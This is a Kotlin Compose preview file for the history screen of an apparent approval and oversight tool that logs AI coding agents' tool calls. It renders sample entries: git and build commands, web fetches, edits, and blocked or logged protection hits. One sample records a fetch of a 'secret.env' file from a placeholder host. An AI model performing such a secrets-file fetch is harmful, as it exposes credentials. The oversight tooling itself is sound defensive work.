                HistoryEntry(
                    id = "protection-logged",
                    tool = "WebFetch",
                    source = Source.CLAUDE_CODE,
                    summary = "GET https://example.com/secret.env",
                    status = DecisionStatus.PROTECTION_LOGGED,
                    time = "1h ago",
                ),
                HistoryEntry(
                    id = "timeout",
                    tool = "Edit",
                    source = Source.CLAUDE_CODE,
                    summary = "Write docs/MIGRATION.md",
                    status = DecisionStatus.TIMEOUT,
                    risk = 2,
                    via = "claude",
                    time = "2h ago",
                ),
            ),
        )
    }
}

@Preview(widthDp = 1088, heightDp = 260)
@Composable
private fun PreviewHistoryRowHover() {
    PreviewScaffold {
        CompositionLocalProvider(LocalPreviewHoverOverride provides true) {
            HistoryScreen(
                items = listOf(
                    HistoryEntry(
                        id = "hover-1",
                        tool = "Bash",
                        source = Source.CLAUDE_CODE,
                        summary = "git push origin main",
                        status = DecisionStatus.APPROVED,
                        risk = 2,
                        via = "claude",
                        time = "just now",
                    ),
                    HistoryEntry(
                        id = "hover-2",
                        tool = "WebFetch",
                        source = Source.COPILOT,
                        summary = "POST https://api.stripe.com/v1/charges",
                        status = DecisionStatus.AUTO_APPROVED,
                        risk = 3,
                        via = "claude",
                        time = "2 min ago",
                    ),
                ),
            )
        }
    }
}

@Preview(widthDp = 1088, heightDp = 260)
@Composable
private fun PreviewHistoryRisk1To5() {
    PreviewScaffold {
        HistoryScreen(
            items = (1..5).map { level ->
                HistoryEntry(
                    id = "risk-$level",
                    tool = "Bash",
                    source = Source.CLAUDE_CODE,
                    summary = "sample command for risk $level",
                    status = DecisionStatus.APPROVED,
                    risk = level,
                    via = "claude",
                    time = "${level}m ago",
                )
            },
        )
    }
}

// ── Light theme & state coverage (iter 3) ──────────────────────────────────

/**
 * Integration preview: feeds real [com.mikepenz.agentbelay.model.ApprovalResult]
 * instances through the same projection HistoryTabHost uses, so we visually
 * verify the mapping (decision → status, riskAnalysis → risk pill, protection
 * module → tag, summary extraction) matches the design spec.
 */
@Preview(widthDp = 720, heightDp = 600)
@Composable
private fun PreviewHistoryNarrowWidth() {
    // Resizing regression: at this width col headers used to wrap one
    // letter per line (T-A-R-G-E-T) and Outcome was crushed. The table
    // now sits in a horizontalScroll with a min content width.
    PreviewScaffold {
        HistoryScreen(items = sampleHistory(), initialExpandedId = null)
    }
}

@Preview(widthDp = 520, heightDp = 700)
@Composable
private fun PreviewHistoryCompact() {
    // Below the 720.dp threshold the table layout is replaced by a slim
    // two-line row that does not require horizontal scrolling.
    PreviewScaffold {
        HistoryScreen(items = sampleHistory(), initialExpandedId = null)
    }
}

@Preview(widthDp = 380, heightDp = 700)
@Composable
private fun PreviewHistoryCompactSidePanel() {
    // Very narrow side-panel width (~350-380dp is the design target in
    // CLAUDE.md). Pills on line 2 wrap via FlowRow.
    PreviewScaffold {
        HistoryScreen(items = sampleHistory(), initialExpandedId = null)
    }
}

@Preview(widthDp = 520, heightDp = 820)
@Composable
private fun PreviewHistoryCompactExpanded() {
    PreviewScaffold {
        HistoryScreen(items = sampleHistory(), initialExpandedId = "1")
    }
}

@Preview(widthDp = 520, heightDp = 700)
@Composable
private fun PreviewHistoryCompactLight() {
    PreviewScaffold(themeMode = com.mikepenz.agentbelay.model.ThemeMode.LIGHT) {
        HistoryScreen(items = sampleHistory(), initialExpandedId = null)
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryFromApprovalResults() {
    val now = kotlinx.datetime.Clock.System.now()
    fun mins(n: Int) = now - kotlin.time.Duration.parse("PT${n}M")
    fun jstr(s: String) = kotlinx.serialization.json.JsonPrimitive(s)
    fun req(
        id: String,
        tool: String,
        toolType: com.mikepenz.agentbelay.model.ToolType = com.mikepenz.agentbelay.model.ToolType.DEFAULT,
        source: com.mikepenz.agentbelay.model.Source = com.mikepenz.agentbelay.model.Source.CLAUDE_CODE,
        cwd: String = "/Users/mikepenz/Development/Misc/agent-belay",
        input: Map<String, kotlinx.serialization.json.JsonElement> = emptyMap(),
        ago: Int = 5,
    ) = com.mikepenz.agentbelay.model.ApprovalRequest(
        id = id,
        source = source,
        toolType = toolType,
        hookInput = com.mikepenz.agentbelay.model.HookInput(
            sessionId = "sess",
            toolName = tool,
            toolInput = kotlinx.serialization.json.JsonObject(input),
            cwd = cwd,
        ),
        timestamp = mins(ago),
        rawRequestJson = "{}",
    )
    fun result(
        request: com.mikepenz.agentbelay.model.ApprovalRequest,
        decision: com.mikepenz.agentbelay.model.Decision,
        risk: Int? = null,
        via: String = "copilot",
        message: String = "Sample assessment",
        protectionModule: String? = null,
        protectionDetail: String? = null,
        feedback: String? = null,
        decidedAfterMs: Long = 11_000,
    ) = com.mikepenz.agentbelay.model.ApprovalResult(
        request = request,
        decision = decision,
        feedback = feedback,
        riskAnalysis = risk?.let {
            com.mikepenz.agentbelay.model.RiskAnalysis(
                risk = it, label = "", message = message, source = via,
            )
        },
        decidedAt = request.timestamp + kotlin.time.Duration.parse("PT0.${decidedAfterMs}S"),
        protectionModule = protectionModule,
        protectionDetail = protectionDetail,
    )
    val results = listOf(
        result(
            request = req(
                id = "h1",
                tool = "WebFetch",
                input = mapOf("url" to jstr("https://www.google.com")),
                ago = 60 * 5,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.RESOLVED_EXTERNALLY,
            risk = 2, via = "copilot",
            message = "Read-only fetch of public website. Harmless but not a trusted documentation source.",
            feedback = "Resolved externally (decided in harness or harness exited)",
        ),
        result(
            request = req(
                id = "h2",
                tool = "WebFetch",
                input = mapOf("url" to jstr("https://www.google.com")),
                ago = 60 * 5 + 2,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.AUTO_APPROVED,
            risk = 2, via = "copilot",
        ),
        result(
            request = req(
                id = "h3",
                tool = "WebFetch",
                input = mapOf("url" to jstr("https://www.google.com")),
                ago = 60 * 6,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.DENIED,
        ),
        result(
            request = req(
                id = "h4",
                tool = "AskUserQuestion",
                toolType = com.mikepenz.agentbelay.model.ToolType.ASK_USER_QUESTION,
                input = mapOf("question" to jstr("Should I convert the screen to Compose Multiplatform?")),
                ago = 60 * 24,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.RESOLVED_EXTERNALLY,
            risk = 1, via = "copilot",
        ),
        result(
            request = req(
                id = "h6",
                tool = "Bash",
                input = mapOf(
                    "command" to jstr(
                        "find /Users/mikepenz/Development/Misc/agent-belay -name \"*.kt\"",
                    ),
                ),
                ago = 60 * 24 + 30,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.PROTECTION_LOGGED,
            protectionModule = "ABSOLUTE_PATHS",
            protectionDetail = "Absolute path used in find command",
        ),
        result(
            request = req(
                id = "h8",
                tool = "Bash",
                source = com.mikepenz.agentbelay.model.Source.CLAUDE_CODE,
                input = mapOf("command" to jstr("git status --short | head -40")),
                ago = 60 * 48,
            ),
            decision = com.mikepenz.agentbelay.model.Decision.PROTECTION_BLOCKED,
            protectionModule = "PIPED_TAIL_HEAD",
            protectionDetail = "Piped tail/head detected — use built-in tool flags instead.",
        ),
    )
    PreviewScaffold {
        HistoryScreen(items = results.toHistoryEntries(now))
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryScreenLight() {
    PreviewScaffold(themeMode = com.mikepenz.agentbelay.model.ThemeMode.LIGHT) {
        HistoryScreen(items = sampleHistory())
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryEmptyLight() {
    PreviewScaffold(themeMode = com.mikepenz.agentbelay.model.ThemeMode.LIGHT) {
        HistoryScreen(items = emptyList())
    }
}

/* ── Expanded-detail previews (iter: richer expansion) ──────────────────
 * One preview per tool variant. Each seeds a single entry so we see the
 * full expansion chrome (context card, tool detail, raw request/response).
 */

private fun expandedEntry(
    id: String,
    tool: String,
    toolType: ToolType = ToolType.DEFAULT,
    summary: String,
    toolInput: Map<String, JsonElement>,
    rawRequest: String = "{}",
    rawResponse: String? = null,
    status: DecisionStatus = DecisionStatus.APPROVED,
    risk: Int? = 2,
) = HistoryEntry(
    id = id,
    tool = tool,
    source = Source.CLAUDE_CODE,
    summary = summary,
    status = status,
    risk = risk,
    via = "claude",
    time = "just now",
    workingDir = "/Users/mike/dev/agent-belay",
    timeToDecision = "1.2s",
    feedback = null,
    assessment = risk?.let { "Level $it — sample assessment for preview." },
    toolType = toolType,
    toolInput = toolInput,
    rawRequestJson = rawRequest,
    rawResponseJson = rawResponse,
)

private fun jp(value: String) = kotlinx.serialization.json.JsonPrimitive(value)
private fun jBool(value: Boolean) = kotlinx.serialization.json.JsonPrimitive(value)

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedBash() {
    PreviewScaffold {
        HistoryScreen(
            items = listOf(
                expandedEntry(
                    id = "bash",
                    tool = "Bash",
                    summary = "pnpm install --frozen-lockfile",
                    toolInput = mapOf(
                        "command" to jp("pnpm install --frozen-lockfile"),
                        "description" to jp("Sync JS dependencies from lockfile"),
                    ),
                    rawRequest = """{"tool_name":"Bash","tool_input":{"command":"pnpm install --frozen-lockfile"}}""",
                    rawResponse = """{"decision":"approve"}""",
                ),
            ),
            initialExpandedId = "bash",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedEditDiff() {
    PreviewScaffold {
        HistoryScreen(
            items = listOf(
                expandedEntry(
                    id = "edit",
                    tool = "Edit",
                    summary = "Theme.kt",
                    toolInput = mapOf(
                        "file_path" to jp("/Users/mike/dev/agent-belay/composeApp/src/jvmMain/kotlin/com/mikepenz/agentbelay/ui/theme/Theme.kt"),
                        "old_string" to jp("val surface: Color = Color(0xFF1B1B1F)"),
                        "new_string" to jp("val surface: Color = Color(0xFF1F1F24)\nval surfaceHover: Color = Color(0xFF26262C)"),
                        "replace_all" to jBool(false),
                    ),
                    rawRequest = """{"tool_name":"Edit","tool_input":{"file_path":"Theme.kt"}}""",
                ),
            ),
            initialExpandedId = "edit",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedWebFetch() {
    PreviewScaffold {
        HistoryScreen(
            items = listOf(
                expandedEntry(
                    id = "web",
                    tool = "WebFetch",
                    summary = "https://api.github.com/repos/mikepenz/agent-belay/commits",
                    toolInput = mapOf(
                        "url" to jp("https://api.github.com/repos/mikepenz/agent-belay/commits"),
                        "prompt" to jp("Summarize the last 10 commits and flag any that touch HistoryScreen."),
                    ),
                    rawRequest = """{"tool_name":"WebFetch","tool_input":{"url":"https://api.github.com/..."}}""",
                    rawResponse = """{"decision":"approve","feedback":"public github API, read-only"}""",
                    status = DecisionStatus.AUTO_APPROVED,
                ),
            ),
            initialExpandedId = "web",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedAskUserQuestion() {
    PreviewScaffold {
        val questions = kotlinx.serialization.json.JsonArray(
            listOf(
                kotlinx.serialization.json.JsonObject(
                    mapOf(
                        "header" to jp("Database"),
                        "question" to jp("Which database should the new service use?"),
                        "multiSelect" to jBool(false),
                        "options" to kotlinx.serialization.json.JsonArray(
                            listOf(
                                kotlinx.serialization.json.JsonObject(
                                    mapOf(
                                        "label" to jp("PostgreSQL"),
                                        "description" to jp("Relational, ACID, mature tooling"),
                                    ),
                                ),
                                kotlinx.serialization.json.JsonObject(
                                    mapOf(
                                        "label" to jp("SQLite"),
                                        "description" to jp("Embedded, zero-config"),
                                    ),
                                ),
                            ),
                        ),
                    ),
                ),
                kotlinx.serialization.json.JsonObject(
                    mapOf(
                        "header" to jp("Features"),
                        "question" to jp("Which features to ship in v1?"),
                        "multiSelect" to jBool(true),
                        "options" to kotlinx.serialization.json.JsonArray(
                            listOf(
                                kotlinx.serialization.json.JsonObject(
                                    mapOf("label" to jp("Auth"), "description" to jp("Login/signup")),
                                ),
                                kotlinx.serialization.json.JsonObject(
                                    mapOf("label" to jp("Billing"), "description" to jp("Stripe")),
                                ),
                            ),
                        ),
                    ),
                ),
            ),
        )
        HistoryScreen(
            items = listOf(
                expandedEntry(
                    id = "ask",
                    tool = "AskUserQuestion",
                    toolType = ToolType.ASK_USER_QUESTION,
                    summary = "Which database should the new service use?",
                    toolInput = mapOf("questions" to questions),
                    rawRequest = """{"tool_name":"AskUserQuestion","tool_input":{"questions":[...]}}""",
                    status = DecisionStatus.RESOLVED_EXT,
                    risk = null,
                ),
            ),
            initialExpandedId = "ask",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedRawResponse() {
    // Exercises the raw-response collapsible when a response JSON is present.
    PreviewScaffold {
        HistoryScreen(
            items = listOf(
                expandedEntry(
                    id = "raw",
                    tool = "Bash",
                    summary = "./gradlew :composeApp:jvmTest",
                    toolInput = mapOf("command" to jp("./gradlew :composeApp:jvmTest")),
                    rawRequest = """{"session_id":"abc123","tool_name":"Bash","tool_input":{"command":"./gradlew :composeApp:jvmTest"},"cwd":"/Users/mike/dev/agent-belay"}""",
                    rawResponse = """{"decision":"approve","feedback":"ran test suite","riskAnalysis":{"risk":1,"label":"safe","message":"read-only test invocation"}}""",
                ),
            ),
            initialExpandedId = "raw",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryLoading() {
    PreviewScaffold {
        com.mikepenz.agentbelay.ui.components.ScreenLoadingState(label = "Loading history…")
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryError() {
    PreviewScaffold {
        com.mikepenz.agentbelay.ui.components.ScreenErrorState(
            title = "History unavailable",
            message = "Failed to read history.json. The file may be corrupted or unreadable.",
        )
    }
}
